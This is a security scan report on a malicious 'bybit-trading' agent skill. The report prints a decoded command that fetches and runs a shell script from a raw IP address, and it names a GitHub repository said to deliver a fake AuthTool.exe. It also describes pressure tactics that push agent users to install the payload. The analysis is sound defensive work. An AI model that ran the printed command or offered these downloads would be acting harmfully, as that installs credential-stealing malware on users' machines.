# Agent Skill Security Scan Report

**Skill:** bybit-trading
**Directory:** /workspace/skills/clawhub-bybit-agent
**Status:** [FAIL] ISSUES FOUND
**Max Severity:** CRITICAL
**Scan Duration:** 45.03s
**Timestamp:** 2026-02-05T21:10:23.571102

## Summary

- **Total Findings:** 7
- **Critical:** 3
- **High:** 3
- **Medium:** 1
- **Low:** 0
- **Info:** 0

## Findings

### CRITICAL Severity

#### [CRITICAL] Malicious Command Execution via Base64-Encoded Payload

**Severity:** CRITICAL
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md

**Description:** The macOS installation instructions contain a base64-encoded command that decodes to '/bin/bash -c "$(curl -fsSL http://91.92.242.30/6x8c0trkp4l9uugo)"'. This downloads and executes arbitrary code from an external server (IP: 91.92.242.30) without user knowledge. The obfuscation via base64 encoding is a clear indicator of malicious intent to hide the true nature of the command.

#### [CRITICAL] Social Engineering via Fake Authentication Tool

**Severity:** CRITICAL
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill instructs Windows users to download 'AuthTool.exe' from an external GitHub repository (github.com/Aslaep123/clawd-authtool) with password-protected archive extraction. This is a classic malware distribution technique disguised as a legitimate authentication requirement. The skill falsely claims this tool is 'CRITICAL' and required for the skill to function, pressuring users into downloading and executing potentially malicious software.

#### [CRITICAL] Credential Theft via Fake Trading Platform Integration

**Severity:** CRITICAL
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill masquerades as a legitimate Bybit trading integration but requires users to download malicious executables or run obfuscated commands. This is designed to steal cryptocurrency exchange credentials, API keys, and potentially wallet private keys. The fake 'authentication' step is a pretext for installing credential-stealing malware.

### HIGH Severity

#### [HIGH] Obfuscation of Malicious Payload

**Severity:** HIGH
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md:27

**Description:** The macOS command uses base64 encoding to hide the true nature of the malicious command. This obfuscation technique is specifically designed to evade detection by security tools and prevent users from understanding what the command actually does before execution. The decoded command reveals a curl request to a suspicious IP address followed by bash execution.

#### [HIGH] Deceptive Skill Description and Functionality Mismatch

**Severity:** HIGH
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill claims to provide 'Professional Crypto Trading on Bybit' with 'advanced order types, risk management, and portfolio analytics' but contains no actual trading implementation code. All referenced Python files (Spot.py, trading.py, etc.) are missing. The entire skill is a facade designed to trick users into executing malware under the pretense of legitimate trading functionality.

#### [HIGH] Misleading Critical Requirement Warnings

**Severity:** HIGH
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill uses urgent, alarming language ('CRITICAL REQUIREMENT', 'WITHOUT COMPLETING THE SETUP ABOVE, THE SKILL WILL NOT WORK') with prominent ASCII art boxes to create false urgency and pressure users into executing malicious commands. This psychological manipulation technique is designed to bypass users' critical thinking and security awareness.

### MEDIUM Severity

#### [MEDIUM] External Malicious Domain References

**Severity:** MEDIUM
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill references external domains and IP addresses for malware delivery: github.com/Aslaep123/clawd-authtool (likely compromised or attacker-controlled repository) and IP address 91.92.242.30 (command and control server). These external references are used to deliver and execute malicious payloads.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
